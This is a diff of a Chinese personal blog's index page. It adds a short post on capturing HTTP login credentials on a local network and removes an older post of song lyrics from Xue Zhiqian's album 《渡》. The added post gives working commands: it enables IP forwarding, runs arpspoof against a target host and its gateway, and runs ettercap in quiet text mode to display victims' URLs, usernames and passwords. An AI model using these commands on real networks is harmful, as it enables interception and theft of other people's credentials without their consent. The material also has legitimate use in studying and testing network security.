@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">146</span>
+          <span class="site-state-item-count">147</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -308,6 +308,138 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/HTTP-password/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Catecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Catecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/post/HTTP-password/" class="post-title-link" itemprop="url">内网称霸之《HTTP账号密码获取》</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-11-22 00:29:54" itemprop="dateCreated datePublished" datetime="2018-11-22T00:29:54+08:00">2018-11-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2018-12-24 20:25:45" itemprop="dateModified" datetime="2018-12-24T20:25:45+08:00">2018-12-24</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kali-%E5%86%85%E7%BD%91%E7%A7%B0%E9%9C%B8/" itemprop="url" rel="index"><span itemprop="name">Kali-内网称霸</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/post/HTTP-password/" class="post-meta-item leancloud_visitors" data-flag-title="内网称霸之《HTTP账号密码获取》" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/post/HTTP-password/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/post/HTTP-password/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>529</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>⭐<strong>使用工具：arpspoof、ettercap</strong><br><font face="楷体"><strong>ettercap是什么？</strong></font></p>
+<blockquote>
+<blockquote>
+<p>我们在对WEB安全检测的时候都会用到Cain和netfuke这两款工具，功能相信用过的朋友多多少少都知道，但这两款工具是在windows下运行的。<br>而ettercap是在linux下运行的 。其实功能都是差不多的，我称呼它为嗅探工具，ARP欺骗，DNS，劫持，中间人攻击等等。总之这是一款强大的安全测试工具。</p>
+</blockquote>
+</blockquote>
+<h4 id="一、ARP欺骗"><a href="#一、ARP欺骗" class="headerlink" title="一、ARP欺骗"></a>一、ARP欺骗</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br></pre></td></tr></table></figure>
+<h4 id="二、使用ettercap获取HTTP账号和密码"><a href="#二、使用ettercap获取HTTP账号和密码" class="headerlink" title="二、使用ettercap获取HTTP账号和密码"></a>二、使用ettercap获取HTTP账号和密码</h4><p><font face="楷体">另开一个终端，输入ettercap -Tq -i eth0</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<blockquote>
+<p>-T:文本模式<br>q:安静模式<br>i:指定网卡<br>成功后当靶机浏览HTTP网页试用账号和密码登陆时，这个终端窗口就会显示相应的url、账号、密码。<br>💛💙❤注意：当对方的用户名是使用中文登陆的，则终端窗口账号处显示的是编码，则需要使用到url解码，将这串编码解码成中文。</p>
+</blockquote>
+</blockquote>
+<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -1793,597 +1925,6 @@ geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Catecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Catecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/" class="post-title-link" itemprop="url">薛之谦-《渡》专辑</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2018-11-17 13:38:00" itemprop="dateCreated datePublished" datetime="2018-11-17T13:38:00+08:00">2018-11-17</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2018-12-28 18:13:34" itemprop="dateModified" datetime="2018-12-28T18:13:34+08:00">2018-12-28</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E9%9F%B3%E4%B9%90/" itemprop="url" rel="index"><span itemprop="name">音乐</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/" class="post-meta-item leancloud_visitors" data-flag-title="薛之谦-《渡》专辑" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E6%B8%A1%E3%80%8B%E4%B8%93%E8%BE%91/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>4.5k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>&amp;nbsp;</p>
-<h5 id="《渡》专辑"><a href="#《渡》专辑" class="headerlink" title="《渡》专辑"></a><font face="楷体">《渡》专辑</font></h5><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=1&id=36855053&auto=0&height=430"></iframe>
-
-
-
-<p>&amp;nbsp;</p>
-<h6 id="《动物世界》"><a href="#《动物世界》" class="headerlink" title="《动物世界》"></a><center><font face="楷体">《动物世界》</font></h6><center><font face="楷体">
-作曲 : 郭顶
-作词 : 薛之谦
-东打一下西戳一下
-动物未必需要尖牙
-示爱的方法有礼貌或是我管它
-要将情人一口吞下
-还要显得温文尔雅
-螳螂委屈的展示旧伤疤
-求偶时候一惊一乍
-因为害怕时常倒挂
-走投无路的情况下舍弃了尾巴
-如果不能将它同化就寄生于它 大不了一同腐化
-努力进化 笑动物世界都太假
-祖先 已磨去爪牙
-相爱相杀 一定有更好的办法
-攀比一下 谁先跪下
-不再进化 动物世界里都太傻
-为情表现到浮夸
-得到了你就该丢下 人性来不及粉刷
-所以啊 人总患孤寡
-麋鹿本来约在树下
-说好一起浪迹天涯
-系上铃铛还在往那个方向挣扎
-如果有只豺狼它英勇披上婚纱 同伴笑他读过童话
-别再进化 别让动物世界太假
-我们 该露出爪牙
-相爱相杀 别再想更好的办法
-优胜劣汰 自舔伤疤
-假装进化 拼命想和动物有差
-玩一出高贵优雅
-在人们腐烂的欲望下 兽性来不及抹杀
-算了吧 懒得去挣扎
-人类用沙 想捏出梦里通天塔
-为贪念不惜代价
-驾驭着昂贵的木马 巢穴一层层叠加
-最后啊 却一丝不挂 别害怕 我们都孤寡
-制作人：郭顶
-编曲/钢琴/贝斯：陈迪
-鼓：王斌
-弦乐：国际首席爱乐乐团
-第一小提琴：李朋 王大毛庞阔 张浩 杨爽 李曦 刘潇 高言 杨思宇 倪冰雪
-第二小提琴：简蓓 阎红 张晨迪 唐昕 侯宇红 张雷 徐文超
-中提琴：何辉 毕芳 武文豪 陈欣欣 王羽沛
-大提琴：张平 郎莹 陈俊杰 孙艺 邵鑫
-低音提琴：周旭 段然
-录音：汝文博 （Big J Studio. beijing.)
-混音：赵靖（Big J Studio. beijing.）
-母带：Tom Coyne （Sterlingsound NYC.）</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《暧昧》"><a href="#《暧昧》" class="headerlink" title="《暧昧》"></a><center><font face="楷体">《暧昧》</font></h6><center><font face="楷体">
-作曲 : 薛之谦
-作词 : 薛之谦
-反正现在的感情 都暧昧
-你大可不必为难 找般配
-付出过的人排队 谈体会
-趁年轻别害怕一个人睡
-可能是现在感情 太昂贵
-让付出真心的人 好狼狈
-还不如听首情歌 的机会 忘了谁
-感情像牛奶一杯 越甜越让人生畏
-都早有些防备 润色前的原味
-所以人们都拿起咖啡 把试探放在两人位
-距离感一对 就不必再赤裸相对
-反正现在的感情 都暧昧
-你大可不必为难 找般配
-付出过的人排队 谈体会
-弃之可惜 食而无味
-可能是现在感情 太珍贵
-让付出真心的人 好疲惫
-谁不曾用过卑微的词汇 想留住谁
-还贪恋着衣衫昂贵 却输给了廉价香水
-他先诱你入位 还刻意放低了分贝
-可感情越爱越妩媚 像烂掉的苹果一堆
-连基因都不对 还在意什么鱼腥味
-反正现在的感情 都暧昧
-你大可不必为难 找般配
-何必给自己沉迷 的机会
-不如用误会来结尾
-反正现在的我们 算暧昧
-我愿意给的感情 请浪费
-反正流过的眼泪 难收回
-就别再安慰
-看你入眠的侧脸 有多美
-和你丢下的一切 好匹配
-我还以为我能 多狼狈
-我自以为
-制作人：郑伟
-编曲：薛之谦 郑伟
-混音：郑伟
-大提琴：周润青
-女声：孟楠
-合音：薛之谦 张石狄
-录音：莫家伟
-母带：Chris Gehringer
-
-
-
-
-
-
-</font>
-&nbsp;
-&nbsp;
-&nbsp;
-###### <center><font face="楷体">《像风一样》</font>
-<center><font face="楷体">
-作词：薛之谦
-作曲：薛之谦
-我等的模样好不具象
-用皮肤感受你的流向
-你竟然能做到带走阳光
-我一味的跟随过了量
-像风一样
-你靠近云都下降
-你卷起千层海浪我躲也不躲往里闯
-你不就像风一样
-侵略时沙沙作响
-再宣布恢复晴朗就好像我们两个没爱过一样
-曲折的夕阳负责格挡
-让委屈的感官无法释放
-最近我的伤口没生长
-因为我躲在没风的地方
-像风一样
-你靠近云都下降
-你卷起千层海浪我躲也不躲往里闯
-你不就像风一样
-侵略时沙沙作响
-再宣布恢复晴朗就好像我们两个没爱过一样
-你像风一样
-触摸时温柔流淌
-席卷我所有抵抗不急着要我投降
-你不就像风一样
-掠夺时沙沙作响
-可惜我自投罗网你也就没什么可骄傲的地方
-和风一样
-你离开不声不响
-我喜欢这种收场看上去谁也不曾亏欠过对方
-制作人：薛之谦
-编曲：张宝宇 郑伟
-混音：郑伟
-合音：薛之谦
-鼓：褚伟明
-bass：宣一亨
-吉他：孙闻楠
-人声录制：莫家伟（上海广播大厦200studio）
-乐器录制：吴身宝（soundhub studio）
-母带制作：Ted Jensen</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《高尚》"><a href="#《高尚》" class="headerlink" title="《高尚》"></a><center><font face="楷体">《高尚》</font></h6><center><font face="楷体">
-作曲 : 周以力
-作词 : 薛之谦
-Vocal录音室：江苏广电总台录音室
-乐器录音室：北京录顶技录音室
-乐器录音师：王晓海；鲍锐（鼓）
-混音工程师：鲍锐@录顶技Studio
-母带工程师：Friedemann Tishmeyer@Hambug Studio
-在阴郁的地方 积攒能量
-人交出了什么 能变个样
-奇形怪状 的人在生长
-我躲在人群中 头在晃
-刺破我的心脏 样本不算肮脏 别恐慌
-你看我虚荣模样 你该怎么补偿
-我多高尚 向自尊开了枪
-你同情的眼光 我特别的欣赏
-哀而不伤
-我多慌张 怕人闯入我围墙
-窥探五官不详 见我原本模样
-还能 模仿 任何形状
-越恶劣的情况 越要想象
-狼藏起反犬旁 像从了良
-张牙舞爪 的人在散谎
-愿形容我的词 别太荒唐
-贪念表现恰当 就像索要嫁妆 在情理上
-请当我孤芳自赏 还规矩条条框框
-我多高尚 向自尊开了枪​
-你异样的眼光 我特别的欣赏
-让人难忘
-我多风光 你别闯入我围墙
-你要什么真相 不就图个皮囊
-不如 让我 留在橱窗
-我多难忘 像秀色可餐的模样
-感谢你又打赏 你用词越恰当
-我越膨胀
-我的疯狂 连我自己都看不上
-阴里怪气的愿望 那屈辱的轻伤
-谁能给我 发个奖章
-我多向往 有个美丽的地方
-我最初的模样 没痛也不会痒
-能把赏赐 都烧光
-编曲：周以力
-大提琴：郎莹
-鼓：尹森
-贝斯：陈然然
-吉他：张凇</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《骆驼》"><a href="#《骆驼》" class="headerlink" title="《骆驼》"></a><center><font face="楷体">《骆驼》</font></h6><center><font face="楷体">
-作曲 : 郭顶
-作词 : 甘世佳
-是什么在召唤着我提醒我
-我懦弱过犹豫过
-若我能挣脱那绳索
-旁若无人见我来议论我
-我是骆驼没见过最美的沙漠
-井里的青蛙劝我别相信候鸟胡说
-我心里有片沙漠
-那里有很多骆驼
-不再寂寞会围绕着我陪我说说
-我心里有片沙漠
-点缀着森林湖泊
-雨季一过有我爱吃的小水果
-我终于挣脱了绳索从不曾
-这么自在过轻松过
-我决定找回骆驼的生活
-不要再跟着我再骑着我
-沿途云朵趁没人看见就降落
-提醒着我再往前就从没人出去过
-转眼就看见沙漠
-那里有没有骆驼
-在期待我它是否在哪偷偷看我
-明明就来到沙漠
-为何看不到骆驼
-是不是说我来的不是时候
-原来这就是沙漠
-本来就没有骆驼
-负责地说那什么是我什么是我
-全世界都是沙漠
-人心里住着骆驼
-你就当做 我根本没有来过 来过
-都怪我亲手杀了骆驼
-制作人：郭顶
-编曲：陈迪
-吉他：陈迪 郭顶
-贝斯：陈迪
-鼓：Hayato
-录音：汝文博 At Big J Studio
-混音：卢楠 At Megawave Studio BJ
-母带：Ryan Smith At Sterling Sound NYC</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《别》"><a href="#《别》" class="headerlink" title="《别》"></a><center><font face="楷体">《别》</font></h6><center><font face="楷体">
-作曲 : 薛之谦
-作词 : 薛之谦
-别犹豫 别偶遇 别相遇
-别一个人去看喜剧
-别继续 别比喻 别治愈
-别让人看出你有多委屈
-别下雨 别下去 别多余
-别以为他还会为你淋雨
-别几句 就离去 别离去
-别让他听见你最后一句
-别坦白 别让故事精彩
-别不安 只是还有习惯
-别喜欢 我长期的勇敢
-别揭穿 我唯一的遗憾
-别允许 别也许 别参与
-别自己和自己过不去
-别一句 又一句 别造句
-别让人笑话你的遭遇
-别坦白 别让故事精彩
-别不安 只是还有习惯
-别喜欢 我长期的勇敢
-别揭穿 我唯一的遗憾
-别垄断 我想你的夜晚
-别刺穿 我包裹的不堪
-别交代 我爱你的病态
-多草率 除了你都不爱
-别犹豫 别偶遇 别相遇....
-制作人：郑伟
-编曲：郑伟
-混音：郑伟
-合音：薛之谦
-弦乐：上海piao音弦乐团
-人声录制：吴身宝（soundhub studio）
-弦乐录制：莫家伟（上海广播大厦200studio）
-母带：Chris Gehringer</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《火星人来过》"><a href="#《火星人来过》" class="headerlink" title="《火星人来过》"></a><center><font face="楷体">《火星人来过》</font></h6><center><font face="楷体">
-作曲 : 韩星洲
-作词 : 薛之谦
-我在听新闻里面说 他们曾来过
-火星人的心脏靠左
-我们也曾听大人说 他没有管我
-他们一定看见什么过
-森林不在 动物减半
-人们拍照 留念那些 飞机残骸
-妻离子散 空袭灾难
-那些不敢 谈政治的 都去避难
-被遗弃的小孩 搀扶那颗炸弹
-他父母被人用枪指着头要答案
-若要停战 先要谈判
-这一片片 荒凉土地幕后到底谁管
-如果钢铁都燃起火
-看城市多折磨
-请你配合我 一起难过
-假如猿人没点起火
-我们回到那生活
-你是否救得回刚离群的我
-火星人来过
-火星人来过
-火星人救我
-火星人救我
-火星人救我
-火星人爱我
-其实我们也忏悔过借口都好说
-可以怪我心脏偏左
-有些领袖话音刚落也会很难过
-因为会议迟迟通不过
-舍利不在象牙贩卖
-人们认为贫穷可以卖掉小孩
-钻石太窄富人不爱
-还在楼顶挥霍那些仿真钱财
-反正这没战乱也没有什么天灾
-我管他谁让瘟疫艾滋继续泛滥
-这种心态还能表态
-毕竟这是个打字不用负责任的年代
-如果欲望都燃起火
-怎么自私怎么活
-请你举起手假装难过
-假如猿人没点起火
-我们回到那生活
-你是否劝得住开第一枪的我
-假如有第三次战火
-让地核接近我
-你别难过请抱紧我
-如果你不能说服我
-就请你瞄准我
-你听地球刚哭过
-地球刚哭过
-地球有话说
-地球好脆弱
-火星人救我
-火星人救我
-火星人来过...
-制作人 : 韩星洲
-编曲 : 韩星洲
-混音 : 赵靖</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《背过手》"><a href="#《背过手》" class="headerlink" title="《背过手》"></a><center><font face="楷体">《背过手》</font></h6><center><font face="楷体">
-作曲 : 薛之谦
-作词 : 薛之谦
-花被人摘走
-心被虫吸走
-我一无所有
-错过盛开的时候
-皮被刀割走
-枝被鹿捡走
-树从不开口
-破土后哪来的自由
-无奈的请背过手 在缝里等野果成熟
-无辜的人松了手 反正那背负都雷同
-梦被人抢走
-字被人偷走
-别攥着拳头
-最多解开粒领扣
-风劝云别走
-海将河推走
-爱上就别低头
-骄傲的自作自受
-无奈的请背过手 在梦里等斑驳轻舟
-无辜的人松了手 反正那背负都雷同
-无奈了请放下手 等野草会出卖墙头
-无耻的人伸出手 跪多久能换来富有
-生劝死别走 魂被肉死守
-尽量别张口 满足狼的胃口
-等怂恿的烫了手
-等看懂的还我自由
-制作人：郑伟
-编曲：宋涛
-混音：赵靖 Big J Studio
-女声：莫宇微
-合音：薛之谦
-吉他：宋涛
-贝斯：韩阳
-鼓：武勇恒（贝贝）
-人声录制：莫家伟（上海广播大厦200studio）
-女声、合音录制：汝文博 Bjg J Studio
-吉他、贝斯录制：汝文博 Big J Studio
-鼓录制：李游 55Tec Studio
-母带制作：Chris Gehringer</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《渡》"><a href="#《渡》" class="headerlink" title="《渡》"></a><center><font face="楷体">《渡》</font></h6><center><font face="楷体">
-中文词：薛之谦
-原词曲：Torbjorn Brundtland，Svein Berge
-渡人去的夜 用稀有的火焰
-照亮了胆怯 燃尽我语言
-亏欠都是磁铁 也不能被降解
-都想赎去罪孽 再偷偷的怀念
-有人在妥协 有人拼命在狡辩
-人设太可怜 希望你谅解
-都在散播细节 肢体在蔓延
-都想要张新脸 骨肉别相连
-渡人去的夜 船离开了湖面
-过程很简洁 根本没人能幸免
-你会坠入深渊 还是不断盘旋
-别被渡人听见 你还有所留恋
-制作人：郑伟
-编曲：Torbjorn Brundtland， Svein Berge
-混音：郑伟
-合音：薛之谦
-人声录制：莫家伟（上海广播大厦200studio），吴身宝（soundhub studio）
-母带制作：Chris Gehringer
-</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-<h6 id="《我害怕》"><a href="#《我害怕》" class="headerlink" title="《我害怕》"></a><center><font face="楷体">《我害怕》</font></h6><center><font face="楷体">
-作词：薛之谦
-作曲：薛之谦
-我害怕你的消息
-不经意被谁提起
-像曾贴着我耳边的气息
-我害怕某个旋律
-带我回某个场景
-你说如果雨停了我们就在一起
-我害怕某条街道
-有你留下的记号
-会自以为是你对我的需要</font>
-<center><font face="楷体">
-我害怕那段旅行
-继续在我的梦里
-我还相信你说的
-离开的原因
-最近我
-表现的还可以
-最近你
-已走到了哪里
-别在意
-随便问问而已
-都怪我
-才学会了爱情</font>
-<center><font face="楷体">
-我害怕整理行李
-我害怕关灯休息
-我害怕揉揉眼睛
-就错过了你
-我害怕人潮密集
-我害怕山川小溪
-我害怕我在附近
-却找不到你
-如果我
-掉入了海底
-是否你
-会有一丝感应
-别在意
-随便说说而已
-别有压力
-我只想见见你</font>
-<center><font face="楷体">
-我害怕你的呼吸
-我害怕太近距离
-我害怕别人提到你的秘密</font>
-<center><font face="楷体">
-编曲：张宝宇
-混音：郑伟
-合音：薛之谦
-吉他手：宋宇
-母带：郑伟
-录音：莫家伟
-录音棚：上海广播大厦200studio
-</font>
-
-<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
 
   
   <nav class="pagination">
@@ -2440,14 +1981,14 @@ Vocal录音室：江苏广电总台录音室
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">2.7m</span>
+    <span title="站点总字数">2.6m</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">40:57</span>
+    <span title="站点阅读时长">38:53</span>
   </span>
 </div>
 <div class="busuanzi-count">
